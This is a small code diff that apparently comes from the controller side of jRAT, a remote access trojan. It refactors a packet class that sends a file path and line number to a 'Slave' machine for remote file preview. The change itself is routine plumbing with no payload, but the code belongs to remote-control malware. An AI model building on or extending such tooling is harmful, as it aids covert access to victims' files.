@@ -2,8 +2,6 @@ package jrat.controller.packets.outgoing;
 
 import jrat.controller.Slave;
 
-import java.io.DataOutputStream;
-
 
 public class Packet60PreviewFile extends AbstractOutgoingPacket {
 
@@ -16,9 +14,9 @@ public class Packet60PreviewFile extends AbstractOutgoingPacket {
 	}
 
 	@Override
-	public void write(Slave slave, DataOutputStream dos) throws Exception {
+	public void write(Slave slave) throws Exception {
 		slave.writeLine(file);
-		dos.writeInt(line);
+		slave.writeInt(line);
 	}
 
 	@Override
